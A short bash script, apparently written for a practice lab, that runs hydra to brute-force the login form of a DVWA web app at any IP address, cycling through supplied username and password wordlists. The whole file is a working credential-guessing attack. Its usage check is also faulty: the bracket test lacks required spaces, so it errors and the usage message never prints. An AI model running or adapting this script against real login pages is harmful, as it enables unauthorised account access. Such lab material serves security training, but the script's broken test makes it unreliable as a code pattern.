#!/bin/bash

if ["$1" == ""]
then
	echo "Usage: ./brute_force.sh [IP] [dico_user.txt] [dico_pswd.txt]"
else
	hydra $1 -L $2 -P $3 http-post-form "/dvwa/login.php :username=^USER^&password=^PASS^&Login=Login :F=Login failed"
fi